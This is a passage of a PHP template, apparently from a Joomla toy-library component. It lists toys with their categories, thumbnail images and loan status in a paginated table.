</select></td><td>Search toy library:</td><td><input type=text size=20 onkeyup = "showResult(this.value)"><div id = "livesearch"></div></td></tr>
</table>
</form>
<!-- END Toy database search -->

<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
<tr><td width=30%><B>Toy name</B></td>
<td width=30%><B>Toy category</B></td>
<td width=30%><B>Toy Photo (small)</B></td>
<td width=10%><B>Status</B></td></tr>
<?php 
if (!empty($row)) {
	// print_r($row);
	foreach ($row as $row_key=>$row_value) {
		echo "<tr onclick='self.location=\"".JURI::current()."?act=1&ddid=$row_key\"'>";
		echo "<td>".$row_value["name"]."</td>\n";
		echo "<td>";
		// Now retrieve the category (ies)
		$query_category = $db->getQuery(true);
		$query_category
		->select(array('a.*','b.category'))
		->from($db->quoteName('#__toydatabase_categorylink','a'))
		->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
		->where($db->quoteName('a.equipmentid') . ' = '. $row_key);
		$db->setQuery((string) $query_category);
		$db->execute();
		$category_rows = $db->loadAssocList();
		foreach ($category_rows as $cat_display) {
			echo $cat_display["category"]."<BR>\n";
		};
		echo "</td>";
		echo "<td>";
		// check the file exists to display the image
		if (file_exists("library_images/".$row_value["picture"])) {
			// dynamically resize image using php
			echo "<img src='toydatabase_thumbnailer.php?img=".$row_value["picture"]."' alt='".$row_value["picture"]."'>";
		} else {
			echo "Sorry no image exists";
		};
		echo "</td>\n";
		echo "<td>";
		switch($row_value["status"]) {
			case "3":
				echo "Damaged/No longer available";
				break;
			case "2":
				echo "Awaiting cleaning/repair";
				break;
			case "1":
				echo "On Loan";
				break;
			case "0":
				echo "Available";
				break;
			default:
				echo "Unknown";
				break;
		};
		echo "</td>\n";
		echo "</tr>";
	};
} else {
	// no rows or toys in database found
	echo "<tr><td colspan=4 align=center><B>Sorry - No items found</B></td></tr>\n";
};
?>
</table><form name='limitdisplay'>
<?php
	echo $pager->getListFooter();
	echo "Number of toys to display per page: ".$pager->getLimitBox()."<BR>\n";
	echo "</form>";
	// end of default: switch
	break;
}; // enc of switch selecting act
?>
<BR>
<center>
<a href="<?=JURI::current()?>">Return to Toy listing</a>
</center>